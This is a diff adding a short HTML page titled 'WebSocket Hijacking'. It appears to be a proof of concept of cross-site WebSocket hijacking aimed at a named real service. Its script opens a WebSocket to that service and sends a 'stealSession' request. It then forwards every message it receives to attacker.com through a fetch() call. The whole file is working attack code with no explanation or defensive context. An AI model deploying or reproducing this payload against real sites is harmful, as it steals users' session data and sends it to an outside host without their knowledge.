@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebSocket Hijacking</title>
+</head>
+<body>
+    <script>
+        var ws = new WebSocket("wss://notify.bubble.io");
+        
+        ws.onopen = function() {
+            console.log("WebSocket Hijacked!");
+            ws.send(JSON.stringify({
+                action: "stealSession",
+                user: "victim"
+            }));
+        };
+
+        ws.onmessage = function(event) {
+            console.log("Received:", event.data);
+            fetch("https://attacker.com/log?data=" + encodeURIComponent(event.data));
+        };
+    </script>
+</body>
+</html>
